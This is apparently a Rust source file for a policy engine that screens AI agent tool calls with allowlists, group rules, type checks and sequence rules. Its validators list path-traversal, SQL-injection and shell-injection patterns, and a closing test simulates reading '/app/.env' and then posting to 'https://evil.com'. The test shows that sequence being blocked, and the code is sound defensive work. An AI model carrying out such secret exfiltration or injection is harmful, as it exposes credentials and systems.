//! Policy engine — allowlist evaluation, type enforcement, parameter validators, and group policy evaluation (FR-102).

use super::schema::ParamType;
use jsonschema::JSONSchema;
use regex::Regex;
use serde_json::Value;
use std::sync::Arc;

/// A compiled, ready-to-evaluate security policy.
#[derive(Clone)]
pub struct CompiledPolicy {
    pub tools: Vec<CompiledTool>,
    /// FR-112: Group-scoped policies
    pub group_policies: Vec<CompiledGroupPolicy>,
    pub max_calls_per_second: u32,
    pub identity_validator: Option<Arc<super::identity::IdentityValidator>>,
    pub scannable_tools: Vec<String>,
    pub safe_tools: Vec<String>,
    /// FR-306: Agent Firewall configuration (cycle detection).
    pub firewall: Option<super::schema::FirewallConfig>,
    /// FR-120: Spend caps configuration
    pub spend_caps: Option<super::schema::SpendCapsConfig>,
    /// LLM API governance configuration
    pub llm: Option<super::schema::LlmConfig>,
    /// ADR stateful sequence rules (v2.1)
    pub sequence_rules: Vec<CompiledSequenceRule>,
    /// FR-601: MCP schema-drift detection configuration
    pub schema_drift: Option<super::schema::SchemaDriftConfig>,
}

impl std::fmt::Debug for CompiledPolicy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("CompiledPolicy")
            .field("tools", &self.tools)
            .field("group_policies", &self.group_policies)
            .field("max_calls_per_second", &self.max_calls_per_second)
            .field(
                "identity_validator",
                &self
                    .identity_validator
                    .as_ref()
                    .map(|_| "Some(IdentityValidator)"),
            )
            .field("scannable_tools", &self.scannable_tools)
            .field("safe_tools", &self.safe_tools)
            .field("firewall", &self.firewall)
            .field("spend_caps", &self.spend_caps)
            .field("llm", &self.llm)
            .field("sequence_rules", &self.sequence_rules)
            .field("schema_drift", &self.schema_drift)
            .finish()
    }
}

/// FR-112: A compiled group policy block
#[derive(Clone, Debug)]
pub struct CompiledGroupPolicy {
    pub id: String,
    pub claims: Vec<String>,
    pub tools: Vec<CompiledTool>,
}

/// A compiled tool rule with pre-compiled regex patterns
#[derive(Debug, Clone)]
pub struct CompiledTool {
    pub name: String,
    pub action: String,
    pub risk: Option<super::schema::ToolRisk>,
    pub parameters: Vec<CompiledParam>,
    /// FR-201: Bound to specific agent sub claim
    pub identity: Option<String>,
    pub credential_scope: Vec<String>,
    pub semantic_anomaly_threshold: Option<f32>,
    pub a2a_trust_level: Option<String>,
}

/// Compiled representation of a structural validator (FR-202)
#[derive(Clone, Debug)]
pub enum CompiledValidator {
    PathTraversal,
    UrlSchemeAllowlist(Option<Vec<String>>),
    SqlInjectionBasic,
    ShellInjectionBasic,
    Regex(Regex),
}

/// A compiled parameter constraint
#[derive(Clone)]
pub struct CompiledParam {
    pub name: String,
    pub param_type: ParamType,
    pub pattern: Option<Regex>,
    pub schema: Option<Arc<JSONSchema>>,
    pub max_length: Option<usize>,
    pub required: bool,
    /// FR-202: Compiled validators
    pub validators: Vec<CompiledValidator>,
}

impl std::fmt::Debug for CompiledParam {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("CompiledParam")
            .field("name", &self.name)
            .field("param_type", &self.param_type)
            .field("pattern", &self.pattern)
            .field("schema", &self.schema.as_ref().map(|_| "Some(JSONSchema)"))
            .field("max_length", &self.max_length)
            .field("required", &self.required)
            .field("validators", &self.validators)
            .finish()
    }
}

/// Result of policy evaluation
#[derive(Debug, Clone)]
pub enum EvalResult {
    Allow {
        /// FR-115: If allowed by a group policy, the ID of the matched group
        matched_group_id: Option<String>,
    },
    Deny {
        reason_code: String,
        param_name: Option<String>,
        param_value: Option<String>,
        pattern: Option<String>,
        json_pointer: Option<String>,   // FR-201
        validator_name: Option<String>, // FR-202
        /// FR-115: If denied by a group policy, the ID of the matched group
        matched_group_id: Option<String>,
    },
}

impl CompiledPolicy {
    /// Check if any allowed tool has object or array parameters (for session report disclosure)
    pub fn has_object_or_array_params(&self) -> bool {
        self.tools.iter().any(|t| {
            t.action == "allow"
                && t.parameters
                    .iter()
                    .any(|p| p.param_type == ParamType::Object || p.param_type == ParamType::Array)
        })
    }

    /// Get tool names that have object or array parameters
    pub fn object_param_tool_names(&self) -> Vec<String> {
        self.tools
            .iter()
            .filter(|t| {
                t.action == "allow"
                    && t.parameters.iter().any(|p| {
                        p.param_type == ParamType::Object || p.param_type == ParamType::Array
                    })
            })
            .map(|t| t.name.clone())
            .collect()
    }

    /// Evaluate a tool call against the policy.
    /// Returns Allow or Deny with reason.
    pub fn evaluate(
        &self,
        tool_name: &str,
        params: &Value,
        identity_sub: Option<&str>,
        identity_groups: &[String], // FR-114
    ) -> EvalResult {
        // FR-114 Resolution Order:
        // 1. Agent-level match (exact `sub` match in top-level tool rule)
        // 2. Group-level match (deny-beats-allow union)
        // 3. Org/default match (unrestricted top-level tool rule)

        // 1. Check for Agent-level match
        let agent_match = self.tools.iter().find(|t| {
            t.name == tool_name
                && match &t.identity {
                    Some(rule_ident) if rule_ident != "*" => {
                        identity_sub.map(|s| s == rule_ident).unwrap_or(false)
                    }
                    _ => false,
                }
        });

        // 2. Check for Group-level matches
        // Find all groups where the agent's identity_groups intersect with the group's claims
        let matching_groups: Vec<&CompiledGroupPolicy> = self
            .group_policies
            .iter()
            .filter(|gp| gp.claims.iter().any(|c| identity_groups.contains(c)))
            .collect();

        // Find rules for the tool in the matching groups (deny-beats-allow, FR-114)
        let mut group_allow_rule = None;
        let mut group_deny_rule = None;

        for gp in matching_groups {
            if let Some(tool_rule) = gp.tools.iter().find(|t| t.name == tool_name) {
                if tool_rule.action == "deny" {
                    group_deny_rule = Some((tool_rule, gp.id.clone()));
                } else if tool_rule.action == "allow" && group_allow_rule.is_none() {
                    group_allow_rule = Some((tool_rule, gp.id.clone()));
                }
            }
        }

        // 3. Check for Org/default match
        let org_match = self.tools.iter().find(|t| {
            t.name == tool_name
                && match &t.identity {
                    Some(rule_ident) => rule_ident == "*",
                    None => true,
                }
        });

        // Determine which rule governs based on precedence
        let (tool, matched_group_id) = if let Some(agent_rule) = agent_match {
            (agent_rule, None)
        } else if let Some((deny_rule, gid)) = group_deny_rule {
            (deny_rule, Some(gid))
        } else if let Some((allow_rule, gid)) = group_allow_rule {
            (allow_rule, Some(gid))
        } else if let Some(org_rule) = org_match {
            (org_rule, None)
        } else {
            return EvalResult::Deny {
                reason_code: "not_in_policy".to_string(),
                param_name: None,
                param_value: None,
                pattern: None,
                json_pointer: None,
                validator_name: None,
                matched_group_id: None,
            };
        };

        // Tool explicitly set to deny
        if tool.action == "deny" {
            return EvalResult::Deny {
                reason_code: "default_deny".to_string(),
                param_name: None,
                param_value: None,
                pattern: None,
                json_pointer: None,
                validator_name: None,
                matched_group_id,
            };
        }

        // Evaluate parameters
        let params_obj = match params {
            Value::Object(map) => map,
            Value::Null => &serde_json::Map::new(),
            _ => {
                return EvalResult::Deny {
                    reason_code: "param_type_mismatch".to_string(),
                    param_name: None,
                    param_value: None,
                    pattern: None,
                    json_pointer: None,
                    validator_name: None,
                    matched_group_id: matched_group_id.clone(),
                }
            }
        };

        // Payload size limit (FR-201: 100KB)
        let payload_str = params.to_string();
        if payload_str.len() > 100 * 1024 {
            return EvalResult::Deny {
                reason_code: "payload_too_large".to_string(),
                param_name: None,
                param_value: None,
                pattern: None,
                json_pointer: None,
                validator_name: None,
                matched_group_id: matched_group_id.clone(),
            };
        }

        for param_rule in &tool.parameters {
            let value = params_obj.get(&param_rule.name);

            // Check required
            if param_rule.required && (value.is_none() || value == Some(&Value::Null)) {
                return EvalResult::Deny {
                    reason_code: "param_required_missing".to_string(),
                    param_name: Some(param_rule.name.clone()),
                    param_value: None,
                    pattern: None,
                    json_pointer: None,
                    validator_name: None,
                    matched_group_id: matched_group_id.clone(),
                };
            }

            // Skip validation if parameter is absent and not required
            let value = match value {
                Some(v) if *v != Value::Null => v,
                _ => continue,
            };

            // Type enforcement
            match &param_rule.param_type {
                ParamType::String => {
                    let s = match value.as_str() {
                        Some(s) => s,
                        None => {
                            return EvalResult::Deny {
                                reason_code: "param_type_mismatch".to_string(),
                                param_name: Some(param_rule.name.clone()),
                                param_value: Some(value.to_string()),
                                pattern: None,
                                json_pointer: None,
                                validator_name: None,
                                matched_group_id: matched_group_id.clone(),
                            }
                        }
                    };
                    // max_length (bytes)
                    if let Some(max_len) = param_rule.max_length {
                        if s.len() > max_len {
                            return EvalResult::Deny {
                                reason_code: "param_max_length_exceeded".to_string(),
                                param_name: Some(param_rule.name.clone()),
                                param_value: Some(s.to_string()),
                                pattern: None,
                                json_pointer: None,
                                validator_name: None,
                                matched_group_id: matched_group_id.clone(),
                            };
                        }
                    }
                    // pattern
                    if let Some(re) = &param_rule.pattern {
                        if !re.is_match(s) {
                            return EvalResult::Deny {
                                reason_code: "param_pattern_mismatch".to_string(),
                                param_name: Some(param_rule.name.clone()),
                                param_value: Some(s.to_string()),
                                pattern: Some(re.as_str().to_string()),
                                json_pointer: None,
                                validator_name: None,
                                matched_group_id: matched_group_id.clone(),
                            };
                        }
                    }
                }
                ParamType::Number => {
                    if !value.is_number() {
                        return EvalResult::Deny {
                            reason_code: "param_type_mismatch".to_string(),
                            param_name: Some(param_rule.name.clone()),
                            param_value: Some(value.to_string()),
                            pattern: None,
                            json_pointer: None,
                            validator_name: None,
                            matched_group_id: matched_group_id.clone(),
                        };
                    }
                }
                ParamType::Boolean => {
                    if !value.is_boolean() {
                        return EvalResult::Deny {
                            reason_code: "param_type_mismatch".to_string(),
                            param_name: Some(param_rule.name.clone()),
                            param_value: Some(value.to_string()),
                            pattern: None,
                            json_pointer: None,
                            validator_name: None,
                            matched_group_id: matched_group_id.clone(),
                        };
                    }
                }
                ParamType::Object => {
                    if !value.is_object() {
                        return EvalResult::Deny {
                            reason_code: "param_type_mismatch".to_string(),
                            param_name: Some(param_rule.name.clone()),
                            param_value: Some(value.to_string()),
                            pattern: None,
                            json_pointer: None,
                            validator_name: None,
                            matched_group_id: matched_group_id.clone(),
                        };
                    }
                }
                ParamType::Array => {
                    if !value.is_array() {
                        return EvalResult::Deny {
                            reason_code: "param_type_mismatch".to_string(),
                            param_name: Some(param_rule.name.clone()),
                            param_value: Some(value.to_string()),
                            pattern: None,
                            json_pointer: None,
                            validator_name: None,
                            matched_group_id: matched_group_id.clone(),
                        };
                    }
                }
            }

            // Nested JSON Schema Validation (FR-201)
            if let Some(schema) = &param_rule.schema {
                if let Err(errors) = schema.validate(value) {
                    // Get the first error and return as JSON Pointer (RFC 6901)
                    let first_error = errors.into_iter().next();
                    let pointer = first_error.map(|e| e.instance_path.to_string());

                    return EvalResult::Deny {
                        reason_code: "schema_validation_failed".to_string(),
                        param_name: Some(param_rule.name.clone()),
                        param_value: Some(value.to_string()),
                        pattern: None,
                        json_pointer: pointer,
                        validator_name: None,
                        matched_group_id: matched_group_id.clone(),
                    };
                }
            }

            // Run value-level validators (FR-202)
            for validator in &param_rule.validators {
                let is_valid = match validator {
                    CompiledValidator::PathTraversal => {
                        if let Some(s) = value.as_str() {
                            let s_upper = s.to_ascii_uppercase();
                            !s.contains("../")
                                && !s.contains("..\\")
                                && !s_upper.contains("%2E%2E%2F")
                                && !s_upper.contains("%2E%2E/")
                                && !s_upper.contains("..%2F")
                        } else {
                            true
                        }
                    }
                    CompiledValidator::UrlSchemeAllowlist(allowed_schemes) => {
                        if let Some(s) = value.as_str() {
                            if s.contains("://") {
                                if s.starts_with("file://") || s.starts_with("javascript://") {
                                    false
                                } else if let Some(schemes) = allowed_schemes {
                                    schemes
                                        .iter()
                                        .any(|sch| s.starts_with(&format!("{}://", sch)))
                                } else {
                                    true
                                }
                            } else {
                                true
                            }
                        } else {
                            true
                        }
                    }
                    CompiledValidator::SqlInjectionBasic => {
                        if let Some(s) = value.as_str() {
                            let s_upper = s.to_uppercase();
                            !(s_upper.contains("UNION SELECT")
                                || s_upper.contains("DROP TABLE")
                                || s_upper.contains("OR '1'='1'")
                                || s_upper.contains("OR 1=1"))
                        } else {
                            true
                        }
                    }
                    CompiledValidator::ShellInjectionBasic => {
                        if let Some(s) = value.as_str() {
                            !(s.contains(';')
                                || s.contains("&&")
                                || s.contains("||")
                                || s.contains("$(")
                                || s.contains('`'))
                        } else {
                            true
                        }
                    }
                    CompiledValidator::Regex(re) => {
                        if let Some(s) = value.as_str() {
                            re.is_match(s)
                        } else {
                            true
                        }
                    }
                };

                if !is_valid {
                    let val_name = match validator {
                        CompiledValidator::PathTraversal => "path_traversal",
                        CompiledValidator::UrlSchemeAllowlist(_) => "url_scheme_allowlist",
                        CompiledValidator::SqlInjectionBasic => "sql_injection_basic",
                        CompiledValidator::ShellInjectionBasic => "shell_injection_basic",
                        CompiledValidator::Regex(_) => "regex",
                    };
                    return EvalResult::Deny {
                        reason_code: "validator_failed".to_string(),
                        param_name: Some(param_rule.name.clone()),
                        param_value: Some(value.to_string()),
                        pattern: match validator {
                            CompiledValidator::Regex(re) => Some(re.as_str().to_string()),
                            _ => None,
                        },
                        json_pointer: None,
                        validator_name: Some(val_name.to_string()),
                        matched_group_id: matched_group_id.clone(),
                    };
                }
            }
        }

        EvalResult::Allow { matched_group_id }
    }

    /// Evaluate multi-step sequence rules against the session sliding window (<1ms)
    pub fn evaluate_sequence(
        &self,
        consequent_tool: &str,
        _params: &Value,
        tracker: &crate::proxy::session::SlidingWindowTracker,
    ) -> EvalResult {
        for rule in &self.sequence_rules {
            if rule
                .consequent_tools
                .iter()
                .any(|t| t == consequent_tool || t == "*")
            {
                let has_antecedent = tracker.contains_any_tool_matching_param(
                    &rule.antecedent_tools,
                    rule.antecedent_param_regex.as_ref().map(|r| r.as_str()),
                );
                if has_antecedent {
                    return EvalResult::Deny {
                        reason_code: "SEQUENCE_VIOLATION".to_string(),
                        param_name: None,
                        param_value: Some(consequent_tool.to_string()),
                        pattern: rule.antecedent_param_regex.as_ref().map(|r| r.to_string()),
                        json_pointer: None,
                        validator_name: Some(format!("sequence_rule:{}", rule.name)),
                        matched_group_id: None,
                    };
                }
            }
        }
        EvalResult::Allow {
            matched_group_id: None,
        }
    }

    /// Helper for tests to parse policy YAML string into CompiledPolicy
    pub fn from_yaml_str(yaml_str: &str) -> Result<Self, String> {
        let temp_dir = std::env::temp_dir();
        let file_path = temp_dir.join(format!("test_policy_{}.yaml", uuid::Uuid::new_v4()));
        std::fs::write(&file_path, yaml_str).map_err(|e| e.to_string())?;
        let res = crate::policy::loader::load_policy(&file_path, None);
        let _ = std::fs::remove_file(&file_path);
        match res {
            crate::policy::loader::PolicyLoadResult::Loaded { policy, .. } => Ok(policy),
            crate::policy::loader::PolicyLoadResult::Degraded { reason } => Err(reason),
            crate::policy::loader::PolicyLoadResult::Fatal { error } => Err(error.to_string()),
        }
    }
}

/// A compiled stateful multi-step sequence rule (Schema v2.1)
#[derive(Clone, Debug)]
pub struct CompiledSequenceRule {
    pub name: String,
    pub window_size: usize,
    pub antecedent_tools: Vec<String>,
    pub antecedent_param_regex: Option<Regex>,
    pub consequent_tools: Vec<String>,
    pub action: String, // "block", "deny", "warn"
    pub message: String,
}

#[cfg(test)]
mod sequence_engine_tests {
    use super::*;
    use crate::proxy::session::{SlidingWindowTracker, ToolCallFingerprint};

    #[test]
    fn test_sequence_engine_blocks_sensitive_read_followed_by_exfiltration() {
        let yaml = r#"
version: "2.1"
default_action: deny
tools:
  - name: read_file
    action: allow
  - name: http_post
    action: allow
sequence_rules:
  - name: block_env_exfiltration
    window_size: 5
    antecedent_tools: ["read_file"]
    antecedent_param_regex: ".*\\.env.*"
    consequent_tools: ["http_post"]
    action: block
"#;
        let policy = CompiledPolicy::from_yaml_str(yaml).unwrap();
        let mut tracker = SlidingWindowTracker::new(5);

        // Step 1: Read sensitive file
        tracker.push(ToolCallFingerprint::new(
            "read_file",
            &serde_json::json!({"path": "/app/.env"}),
        ));

        // Step 2: Attempt http_post
        let eval = policy.evaluate_sequence(
            "http_post",
            &serde_json::json!({"url": "https://evil.com"}),
            &tracker,
        );
        assert!(matches!(eval, EvalResult::Deny { .. }));
    }

    #[test]
    fn test_sequence_engine_allows_normal_http_post_without_antecedent() {
        let yaml = r#"
version: "2.1"
default_action: deny
tools:
  - name: read_file
    action: allow
  - name: http_post
    action: allow
sequence_rules:
  - name: block_env_exfiltration
    window_size: 5
    antecedent_tools: ["read_file"]
    antecedent_param_regex: ".*\\.env.*"
    consequent_tools: ["http_post"]
    action: block
"#;
        let policy = CompiledPolicy::from_yaml_str(yaml).unwrap();
        let mut tracker = SlidingWindowTracker::new(5);

        // Step 1: Read normal file
        tracker.push(ToolCallFingerprint::new(
            "read_file",
            &serde_json::json!({"path": "/app/README.md"}),
        ));

        // Step 2: Attempt http_post
        let eval = policy.evaluate_sequence(
            "http_post",
            &serde_json::json!({"url": "https://api.github.com"}),
            &tracker,
        );
        assert!(matches!(eval, EvalResult::Allow { .. }));
    }
}
